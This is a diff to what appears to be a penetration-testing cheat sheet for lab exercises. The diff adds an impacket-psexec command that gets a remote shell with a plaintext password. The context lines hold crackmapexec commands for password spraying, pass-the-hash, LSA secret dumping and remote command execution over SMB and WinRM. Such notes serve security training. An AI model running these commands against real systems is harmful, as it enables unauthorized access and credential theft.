@@ -2172,6 +2172,10 @@ crackmapexec smb 10.11.1.120-124 -u Daisy -p XorPasswordIsDead17 -d xor.com -x w
 crackmapexec smb 10.11.1.120-124 -u administrator -H 'LMHASH:NTHASH' --local-auth --lsa #for hashes
 crackmapexec smb 10.11.1.20-24 -u pete -H b566afa0a7e41755a286cba1a7a3012d --exec-method smbexec -X 'whoami'
 ````
+
+````
+impacket-psexec joe:Flowers1@172.16.138.11 cmd.exe
+````
 ###### winrm
 ````
 proxychains crackmapexec winrm 172.16.138.10-83 -u users.txt -p Mushroom! -d MEDTECH.COM -x whoami
